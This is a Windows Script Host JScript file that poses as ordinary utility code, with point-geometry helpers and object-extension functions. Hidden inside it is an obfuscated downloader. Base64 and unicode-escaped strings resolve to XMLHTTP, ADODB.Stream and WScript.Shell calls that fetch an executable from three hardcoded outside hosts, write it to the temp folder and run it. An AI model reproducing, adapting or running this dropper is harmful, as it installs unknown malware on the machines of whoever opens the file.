var deadened = 0;
var gainsay = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  installations = [];
var slink = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function assets(breaks) {
	evaluating = breaks;
	for (var i in slink){evaluating = evaluating.replace(i, slink[i]);}
    return evaluating;
};

var wither = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.assets4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("eerie").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = gainsay[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = gainsay[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = gainsay[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = gainsay[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var viscid ="eerieJVeerieRFTVeerieAl".assets4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var already = "eerieQWeerieN0aXZeerielWE9iaeeriemVjdA=eerie=".assets4();
String.prototype.assets2 = function () {
    var drama = {
        achievements: this
    };
    drama.analogies = drama.achievements["c3Vic3RyaW5n".assets4()](deadened, wither);
    return drama.analogies;
};

var satrap ="eerieRXhwYW5eeriekRW52aXeerieJvbm1lbnRTdHJeeriepbmdz".assets4();
var Native = function(options){
	
};
var romeo = [already, satrap,viscid,  ""+"."+("welling","martial","limpid","restored","terrifying","extermination","surrey","inflated","exe"), "UnVu".assets4(), assets("M"+"SX"+"ML"+("exhale","regency","province","online","extravagantly","taper","pronunciation","2.")+"|M"+"LH"+"TT"+("identified","scientist","nights","gradually","immensity","antecedent","fiftyeight","brats","P>")+"WU"+("fusion","spanish","storehouse","rwanda","stint","hiatus","compaq","cr")+("under","fraught","nationalism","studios","cocks","acutely","chevy","niger","ip")+"t:"+("fussy","residence","badinage","troupe","spongy","basin","designation","bolting","Sh")+"ell")];
complications = "_F2_";
var laity = this[romeo.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
fidwyvorDkN = "cFNxgQqiWT";
installation = (("provisions", "lender", "blade", "worked", "baskets", "medication", "kitchen", "pdXuucfNDqo") + "TiKllKf").assets2();
earliest = (("husbandry", "dilettante", "potentate", "converter", "desist", "midlands", "autobiography", "priestcraft", "disclosure", "siOXIWTO") + "fnlUXk").assets2();
  
    String.prototype.haven = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var mayor = romeo.pop().split(">");

msgstr = "b3Blbg==".assets4();
var dilute = new laity(mayor[1]);
YyeallOF = "_F3_";
var clumsily = new laity(mayor[0]);
var processor = dilute[romeo.shift()](romeo.shift());
MFWAxq = "_F5_";
weasel = (("arena", "dowager", "astounding", "twitching", "EuLKEMTFF") + "NLYfow").assets2();

var sorts = romeo.shift();
var deviant = romeo.shift();
function typically(confounds, sixtyfive) {

    try {
        var investigated = processor + "/" + sixtyfive ;
		investigated = investigated+ sorts;
            clumsily[msgstr](("insecure","stagnation","G" + weasel) + ("manhattan","jaguar","efficient","matched","T"), confounds, false);
       
    mXIqfssJN = "_F7_";
    clumsily[earliest + ("sanity","transferred","end")]();
	var portugal=(WScript+"installation"=="V2luZG93cyBTY3JpcHQgSG9zdA==".assets4()+"installation")&&clumsily["c3RhdHVz".assets4()] +""=="MjAw".assets4()&&typeof(MhJSWsizol)==="undefined";
	lQHNgR = "_F8_";
    if (portugal) {
		
        var provisional = new laity((("peers","doctor","collectibles","castilian","overseas","propound","conversant","render","A")+("goodfellowship","eventually","endearing","steel","reciprocate","johannesburg","restingplace","settler","SEOO")+"DB"+("althea","enforcement","routes","progeny","booby","stays","serving",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        provisional[msgstr]();
        kukHERj = "_F9_";
        provisional.type = wither;
        uSjGzYng = "_F10_";
        provisional["d3JpdGU=".assets4()](clumsily[("freshmen","quality","admixture","switzerland","expenditures","rugby","episodes","")+"R"+"es"+"pon"+slink['U'].toLowerCase()+"e"+"Qm9keQ==".assets4()]);
        sbtaPbg = "_F11_";
        provisional[(installation + "o"+("limiting","despot","glassy","there","ukraine","viewing","symbolism","crispin","00")+("inspection","heliotrope","tried","talmud","product","passage","enumeration","8i")+"tion").replace("0"+("inimical","identity","dazzle","unexplained","phentermine","inaugurate","appearing","08"), earliest)] = 0;
        UjQtPFal = "_F12_";
        provisional[("shirts","namespace","coupe","record","solder","twentysixth","promulgation","s")+"aveT"+"oF"+"ile"](investigated, 2);
        bDyHzAjm = "_F13_";
        provisional.close();
        RCAjSImT = "_F14_";
		dilute[deviant](investigated, wither, true);
    }
} catch (mRhusd) { };

    JIrdDni = "_F15_";
}
try{
typically("aHR0cDovLw==".assets4()+"\u0061\u0062\u0061\u006C\u0061\u006B\u006F\u0076\u002E\u0072"+"\u0075\u002F\u0032\u0033\u0072\u0032\u0033\u0066\u0034\u0032" + "?iWJGFSAk=wjCWKpihVy","tjGkuxORQi");}catch(EtfbVXEnnL){}

try{
typically("aHR0cDovLw==".assets4()+"\u0062\u0072\u0061\u0073\u0063\u006F\u006E\u0073\u0075\u006C\u0074\u002E"+"\u0072\u0075\u002F\u0033\u0034\u0074\u0067\u0074\u0062\u0076\u0063\u0071" + "?tXjzmXsiV=NubXqymid","sFGDjQJtjB");}catch(kcLPIbTkQy){}
typically("aHR0cDovLw==".assets4()+"\u0063\u006C\u0069\u006E\u0069\u0063\u002E\u0067\u006F\u0076\u002E\u0075"+"\u0061\u002F\u0034\u0079\u0035\u0033\u0074\u0032\u0066\u0064\u0067\u0072" + "?lhPYdcEzse=coNqEqv","YXtXDsp");
   GxrWmj = "_F16_";
   